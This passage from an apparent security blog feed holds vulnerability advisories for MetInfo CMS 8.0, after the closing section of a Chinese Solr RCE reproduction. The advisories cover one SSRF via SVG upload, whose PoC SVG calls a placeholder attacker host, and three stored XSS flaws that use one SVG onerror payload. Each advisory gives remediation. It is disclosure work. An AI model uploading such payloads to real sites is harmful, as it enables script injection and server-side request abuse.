title="6.补丁管理和安全扫描："></a>6.补丁管理和安全扫描：</h3><p>及时应用所有官方发布的安全补丁，并使用安全扫描工具定期检查系统中是否存在已知漏洞。</p><p>关注 Apache Solr 项目的安全公告，确保及时跟进修复建议。</p><h2 id="十、总结"><a href="#十、总结" class="headerlink" title="十、总结"></a>十、总结</h2><p>本次实验复现了Solr远程代码执行漏洞。实验中启用模板构造恶意请求，实现远程命令执行。结果显示漏洞可窃取敏感信息并控制系统。验证提醒用户及时更新系统或关闭无用功能，强化防护，确保为漏洞修复提供充分依据。</p>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>solr</tag>
      
      <tag>远程命令执行</tag>
      
      <tag>CVE-2019-17558</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF Vulnerability in MetInfo 8.0 via SVG File Upload</title>
    <link href="/2025/08/22/SSRF-Vulnerability-in-MetInfo-8.0-via-SVG-Upload/"/>
    <url>/2025/08/22/SSRF-Vulnerability-in-MetInfo-8.0-via-SVG-Upload/</url>
    
    <content type="html"><![CDATA[<h1 id="SSRF-Vulnerability-in-MetInfo-8-0-via-SVG-File-Upload"><a href="#SSRF-Vulnerability-in-MetInfo-8-0-via-SVG-File-Upload" class="headerlink" title="SSRF Vulnerability in MetInfo 8.0 via SVG File Upload"></a>SSRF Vulnerability in MetInfo 8.0 via SVG File Upload</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A Server-Side Request Forgery (SSRF) vulnerability exists in MetInfo 8.0 that allows attackers to make arbitrary HTTP requests from the server by uploading malicious SVG files. The vulnerability occurs in the column management component where uploaded SVG files with embedded external image references can trigger outbound requests to attacker-controlled servers.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li>Product: MetInfo CMS</li><li>Version: 8.0</li><li>Component: Column Management (<code>app\system\column\admin\index.class.php</code>)</li><li>CWE: CWE-918: Server-Side Request Forgery (SSRF)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>The environment was set up locally using PHPStudy, accessing the site at <code>http://metlnfo/</code>. After logging into the admin panel, I navigated to the column management section at <code>http://metlnfo/admin/#/column</code> where file upload functionality was discovered.</p><p>Column management interface:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20111153.png" alt="Column Management Interface"></p><p>File upload functionality in settings:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20111227.png" alt="File Upload Interface"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>The vulnerability can be exploited by uploading an SVG file containing an external image reference that points to an attacker-controlled server. The SVG payload is as follows:</p><figure class="highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs svg"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">&quot;http://XXX.XXX.XXX.XXX:8000&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Upload the malicious SVG file through the column management interface:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20111304.png" alt="SVG Upload Success"></p><p>When the uploaded SVG is viewed or processed by the server, it triggers an outbound HTTP request to the specified URL:</p><p><img src="/img/image-20251017131240975.png" alt="SSRF Request Execution"></p><p>The attacker’s server receives the request, confirming successful SSRF exploitation:</p><p><img src="/img/image-20251017131312320.png" alt="SSRF Confirmation"></p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><ul><li>Type: Server-Side Request Forgery (SSRF)</li><li>Who is impacted: The MetInfo server and internal network resources</li><li>Consequences:<ol><li>Unauthorized outbound HTTP requests from the server</li><li>Potential access to internal services and resources</li><li>Information disclosure through request responses</li><li>Potential for further attacks against internal infrastructure</li></ol></li></ul><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To mitigate this SSRF vulnerability, MetInfo should:</p><ol><li>Implement strict file type validation for uploaded files</li><li>Sanitize SVG content to remove external references before processing</li><li>Use a whitelist of allowed domains for external resource loading</li><li>Implement network-level restrictions to prevent outbound requests to internal networks</li><li>Consider using a content security policy to restrict external resource loading</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li>2025-08-22: Vulnerability discovered and documented</li><li>2025-10-17: Additional testing and confirmation</li><li>[Future Date]: Vendor notified</li><li>[Future Date]: CVE requested&#x2F;assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>SSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stored XSS Vulnerability in MetInfo CMS Webset Module via SVG Upload</title>
    <link href="/2025/08/22/Stored-XSS-Vulnerability-in-MetInfo-Webset-Module/"/>
    <url>/2025/08/22/Stored-XSS-Vulnerability-in-MetInfo-Webset-Module/</url>
    
    <content type="html"><![CDATA[<h1 id="Stored-XSS-Vulnerability-in-MetInfo-CMS-Webset-Module-via-SVG-Upload"><a href="#Stored-XSS-Vulnerability-in-MetInfo-CMS-Webset-Module-via-SVG-Upload" class="headerlink" title="Stored XSS Vulnerability in MetInfo CMS Webset Module via SVG Upload"></a>Stored XSS Vulnerability in MetInfo CMS Webset Module via SVG Upload</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in MetInfo CMS version 8.0. The vulnerability exists due to insufficient validation and sanitization of SVG file uploads in the <code>app\system\include\module\uploadify.class.php</code> component, specifically in the website settings module. This security flaw allows attackers to upload malicious SVG files containing JavaScript code that executes when the uploaded file is viewed or accessed.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: MetInfo CMS</li><li><strong>Version</strong>: 8.0</li><li><strong>Component</strong>: File Upload Functionality (<code>app\system\include\module\uploadify.class.php</code>)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed MetInfo CMS 8.0 locally using PHPStudy with the access URL <a href="http://metlnfo/">http://metlnfo/</a>. The source code is available at: <a href="https://www.metinfo.cn/download/89.html">https://www.metinfo.cn/download/89.html</a></p><p>After logging into the admin panel, I identified the website settings module at the URL path <code>http://metlnfo/admin/#/webset/?head_tab_active=0</code> which allows uploading of various file types without proper validation.</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20143635.png" alt="Website Settings Interface"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>I created a malicious SVG file with the following content:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS测试&#x27;)&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>The file was successfully uploaded to the website settings module without any content validation or sanitization:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20143823.png" alt="Successful Upload Confirmation"></p><p>When viewing the uploaded file, the JavaScript code embedded in the SVG was automatically executed in the browser context:</p><p><img src="/img/image-20250822143908393.png" alt="XSS Execution Proof"></p><p>After clicking the “Save” button, the malicious SVG file was permanently stored in the system, resulting in a stored XSS vulnerability that would trigger whenever any user accessed the affected settings page:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20143921.png" alt="Stored XSS Persistence"></p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the file upload handling component (<code>app\system\include\module\uploadify.class.php</code>), which fails to:</p><ol><li>Properly validate the content of SVG files before accepting them</li><li>Sanitize potentially dangerous elements and attributes in SVG files</li><li>Implement proper MIME type restrictions for uploaded files</li><li>Convert SVG files to safer image formats before storing them</li></ol><p>The core issue is that the upload functionality in the website settings module allows SVG files to be uploaded and later served with the correct MIME type that enables JavaScript execution within the browser.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers with administrative access to:</p><ol><li>Execute arbitrary JavaScript code in the context of other users’ browsers, including site administrators</li><li>Steal sensitive information such as session cookies and authentication tokens</li><li>Perform unauthorized actions on behalf of victims</li><li>Potentially escalate to more severe attacks by chaining with other vulnerabilities</li></ol><p>While exploitation requires administrative access to the website settings feature, it creates a significant security risk as the stored XSS payload can affect any user viewing the compromised settings page, including higher-privileged administrators.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should implement the following security measures:</p><ol><li>Enhance the <code>uploadify.class.php</code> component to perform content validation and sanitization of SVG files</li><li>Strip potentially dangerous elements and attributes from SVG files</li><li>Consider converting SVG files to raster image formats (PNG, JPEG) during the upload process</li><li>Implement proper Content Security Policy (CSP) headers to prevent script execution from uploaded files</li><li>Serve SVG files with a MIME type that prevents script execution (e.g., <code>image/svg+xml-sanitized</code>)</li><li>Implement stricter file type checking that goes beyond extension validation</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-22</strong>: Vulnerability discovered</li><li><strong>2025-08-22</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stored XSS Vulnerability in MetInfo CMS Column Module</title>
    <link href="/2025/08/22/Stored-XSS-in-MetInfo-Column-Module/"/>
    <url>/2025/08/22/Stored-XSS-in-MetInfo-Column-Module/</url>
    
    <content type="html"><![CDATA[<h1 id="Stored-XSS-Vulnerability-in-MetInfo-CMS-Column-Module"><a href="#Stored-XSS-Vulnerability-in-MetInfo-CMS-Column-Module" class="headerlink" title="Stored XSS Vulnerability in MetInfo CMS Column Module"></a>Stored XSS Vulnerability in MetInfo CMS Column Module</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in MetInfo CMS version 8.0. The vulnerability exists in the column management module, specifically in the <code>app\system\column\admin\index.class.php</code> component. The vulnerability allows attackers to upload malicious SVG files containing JavaScript code that executes when the uploaded file is viewed or accessed by users.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: MetInfo CMS</li><li><strong>Version</strong>: 8.0</li><li><strong>Component</strong>: Column Management Module (<code>app\system\column\admin\index.class.php</code>)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed MetInfo CMS 8.0 locally using PHPStudy with the access URL <a href="http://metlnfo/">http://metlnfo/</a>. The source code is available at: <a href="https://www.metinfo.cn/download/89.html">https://www.metinfo.cn/download/89.html</a></p><p>After logging into the admin panel, I accessed the column management module at <code>http://metlnfo/admin/#/column</code> which utilizes the vulnerable component.</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20111153.png" alt="Column Management Interface"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>After accessing the column management module, I selected the settings option which revealed a file upload functionality:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20111227.png" alt="File Upload Interface"></p><p>I created a malicious SVG file with the following content:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS测试&#x27;)&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>The file was successfully uploaded without any content validation or sanitization:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20111304.png" alt="Successful Upload Confirmation"></p><p>When viewing the uploaded file, the JavaScript code embedded in the SVG was automatically executed in the browser context:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20111321.png" alt="XSS Execution Proof"></p><p>After clicking the “Save” button, the malicious SVG file was permanently stored in the system, resulting in a stored XSS vulnerability:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20111651.png" alt="Stored XSS Persistence"></p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the column management module’s file upload handling, which fails to:</p><ol><li>Properly validate the content of SVG files before accepting them</li><li>Sanitize potentially dangerous elements and attributes in SVG files</li><li>Implement proper MIME type restrictions for uploaded files</li><li>Convert SVG files to safer image formats before storing them</li></ol><p>The core issue is that the column management module allows SVG files to be uploaded and later served with the correct MIME type that enables JavaScript execution within the browser.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers with administrative access to:</p><ol><li>Execute arbitrary JavaScript code in the context of other users’ browsers, including administrators</li><li>Steal sensitive information such as session cookies and authentication tokens</li><li>Perform unauthorized actions on behalf of victims</li><li>Potentially escalate to more severe attacks by chaining with other vulnerabilities</li></ol><p>Since the column management is a core feature accessed by administrators, this vulnerability could lead to complete administrative account compromise.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should implement the following security measures:</p><ol><li>Enhance the column management module to perform content validation and sanitization of SVG files</li><li>Strip potentially dangerous elements and attributes from SVG files</li><li>Consider converting SVG files to raster image formats (PNG, JPEG) during the upload process</li><li>Implement proper Content Security Policy (CSP) headers to prevent script execution from uploaded files</li><li>Serve SVG files with a MIME type that prevents script execution (e.g., <code>image/svg+xml-sanitized</code>)</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-22</strong>: Vulnerability discovered</li><li><strong>2025-08-22</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stored XSS Vulnerability in MetInfo CMS Download Module</title>
    <link href="/2025/08/22/Stored-XSS-in-MetInfo-Download-Module/"/>
    <url>/2025/08/22/Stored-XSS-in-MetInfo-Download-Module/</url>
    
    <content type="html"><![CDATA[<h1 id="Stored-XSS-Vulnerability-in-MetInfo-CMS-Download-Module"><a href="#Stored-XSS-Vulnerability-in-MetInfo-CMS-Download-Module" class="headerlink" title="Stored XSS Vulnerability in MetInfo CMS Download Module"></a>Stored XSS Vulnerability in MetInfo CMS Download Module</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in MetInfo CMS version 8.0. The vulnerability exists in the download management module, specifically in the <code>app\system\download\admin\download_admin.class.php</code> component. The vulnerability allows attackers to upload malicious SVG files containing JavaScript code that executes when the uploaded file is viewed or accessed by users.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: MetInfo CMS</li><li><strong>Version</strong>: 8.0</li><li><strong>Component</strong>: Download Management Module (<code>app\system\download\admin\download_admin.class.php</code>)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed MetInfo CMS 8.0 locally using PHPStudy with the access URL <a href="http://metlnfo/">http://metlnfo/</a>. The source code is available at: <a href="https://www.metinfo.cn/download/89.html">https://www.metinfo.cn/download/89.html</a></p><p>After logging into the admin panel, I accessed the download management module at <code>http://metlnfo/admin/#/manage/?module=download&amp;class1=129</code> which utilizes the vulnerable component.</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20104459.png" alt="Download Management Interface"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>After accessing the download management module, I selected the edit option which revealed a file upload functionality:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20104601.png" alt="File Upload Interface"></p><p>I created a malicious SVG file with the following content:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS测试&#x27;)&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>The file was successfully uploaded without any content validation or sanitization:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20104720.png" alt="Successful Upload Confirmation"></p><p>When viewing the uploaded file, the JavaScript code embedded in the SVG was automatically executed in the browser context:</p><p><img src="/img/image-20250822104811764.png" alt="XSS Execution Proof"></p><p>After clicking the “Save” button, the malicious SVG file was permanently stored in the system, resulting in a stored XSS vulnerability that affects both front-end users and administrators:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20104832.png" alt="Stored XSS Persistence"></p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the download management module’s file upload handling, which fails to:</p><ol><li>Properly validate the content of SVG files before accepting them</li><li>Sanitize potentially dangerous elements and attributes in SVG files</li><li>Implement proper MIME type restrictions for uploaded files</li><li>Convert SVG files to safer image formats before storing them</li></ol><p>The core issue is that the download management module allows SVG files to be uploaded and later served with the correct MIME type that enables JavaScript execution within the browser.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers with administrative access to:</p><ol><li>Execute arbitrary JavaScript code in the context of other users’ browsers, including administrators and front-end users</li><li>Steal sensitive information such as session cookies and authentication tokens</li><li>Perform unauthorized actions on behalf of victims</li><li>Potentially escalate to more severe attacks by chaining with other vulnerabilities</li></ol><p>As confirmed in testing, the impact extends to both front-end and back-end users, creating a significant security risk for all site visitors.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should implement the following security measures:</p><ol><li>Enhance the download management module to perform content validation and sanitization of SVG files</li><li>Strip potentially dangerous elements and attributes from SVG files</li><li>Consider converting SVG files to raster image formats (PNG, JPEG) during the upload process</li><li>Implement proper Content Security Policy (CSP) headers to prevent script execution from uploaded files</li><li>Serve SVG files with a MIME type that prevents script execution (e.g., <code>image/svg+xml-sanitized</code>)</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-22</strong>: Vulnerability discovered</li><li><strong>2025-08-22</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stored XSS Vulnerability in MetInfo CMS Image Module</title>
    <link href="/2025/08/22/Stored-XSS-in-MetInfo-Image-Module/"/>
    <url>/2025/08/22/Stored-XSS-in-MetInfo-Image-Module/</url>
    
    <content type="html"><![CDATA[<h1 id="Stored-XSS-Vulnerability-in-MetInfo-CMS-Image-Module"><a href="#Stored-XSS-Vulnerability-in-MetInfo-CMS-Image-Module" class="headerlink" title="Stored XSS Vulnerability in MetInfo CMS Image Module"></a>Stored XSS Vulnerability in MetInfo CMS Image Module</h1><h2 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h2><p>A stored Cross-Site Scripting (XSS) vulnerability has been discovered in MetInfo CMS version 8.0. The vulnerability exists in the image management module, specifically in the <code>app\system\img\admin\img_admin.class.php</code> component. The vulnerability allows attackers to upload malicious SVG files containing JavaScript code that executes when the uploaded file is viewed or accessed by users.</p><h2 id="Affected-Product"><a href="#Affected-Product" class="headerlink" title="Affected Product"></a>Affected Product</h2><ul><li><strong>Product</strong>: MetInfo CMS</li><li><strong>Version</strong>: 8.0</li><li><strong>Component</strong>: Image Management Module (<code>app\system\img\admin\img_admin.class.php</code>)</li><li><strong>CWE</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</li></ul><h2 id="Technical-Details"><a href="#Technical-Details" class="headerlink" title="Technical Details"></a>Technical Details</h2><p>I deployed MetInfo CMS 8.0 locally using PHPStudy with the access URL <a href="http://metlnfo/">http://metlnfo/</a>. The source code is available at: <a href="https://www.metinfo.cn/download/89.html">https://www.metinfo.cn/download/89.html</a></p><p>After logging into the admin panel, I accessed the image management module at <code>http://metlnfo/admin/#/manage/?module=img&amp;class1=130</code> which utilizes the vulnerable component.</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20105155.png" alt="Image Management Interface"></p><h2 id="Proof-of-Concept-PoC"><a href="#Proof-of-Concept-PoC" class="headerlink" title="Proof of Concept (PoC)"></a>Proof of Concept (PoC)</h2><p>After accessing the image management module, I selected the edit option which revealed a file upload functionality:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20105444.png" alt="File Upload Interface"></p><p>I created a malicious SVG file with the following content:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(&#x27;XSS测试&#x27;)&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>The file was successfully uploaded without any content validation or sanitization:</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-22%20105605.png" alt="Successful Upload Confirmation"></p><p>When viewing the uploaded file, the JavaScript code embedded in the SVG was automatically executed in the browser context:</p><p><img src="/img/image-20250822105730183.png" alt="XSS Execution Proof"></p><p>After clicking the “Save” button, the malicious SVG file was permanently stored in the system, resulting in a stored XSS vulnerability that affects both front-end users and administrators.</p><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the image management module’s file upload handling, which fails to:</p><ol><li>Properly validate the content of SVG files before accepting them</li><li>Sanitize potentially dangerous elements and attributes in SVG files</li><li>Implement proper MIME type restrictions for uploaded files</li><li>Convert SVG files to safer image formats before storing them</li></ol><p>The core issue is that the image management module allows SVG files to be uploaded and later served with the correct MIME type that enables JavaScript execution within the browser.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers with administrative access to:</p><ol><li>Execute arbitrary JavaScript code in the context of other users’ browsers, including administrators and front-end users</li><li>Steal sensitive information such as session cookies and authentication tokens</li><li>Perform unauthorized actions on behalf of victims</li><li>Potentially escalate to more severe attacks by chaining with other vulnerabilities</li></ol><p>As confirmed in testing, the impact extends to both front-end and back-end users, creating a significant security risk for all site visitors.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should implement the following security measures:</p><ol><li>Enhance the image management module to perform content validation and sanitization of SVG files</li><li>Strip potentially dangerous elements and attributes from SVG files</li><li>Consider converting SVG files to raster image formats (PNG, JPEG) during the upload process</li><li>Implement proper Content Security Policy (CSP) headers to prevent script execution from uploaded files</li><li>Serve SVG files with a MIME type that prevents script execution (e.g., <code>image/svg+xml-sanitized</code>)</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-22</strong>: Vulnerability discovered</li><li><strong>2025-08-22</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Information Disclosure and Source Code Leakage Vulnerability in SeaCMS</title>
    <link href="/2025/08/21/Information-Disclosure-Vulnerability-in-SeaCMS/"/>
    <url>/2025/08/21/Information-Disclosure-Vulnerability-in-SeaCMS/</url>
    
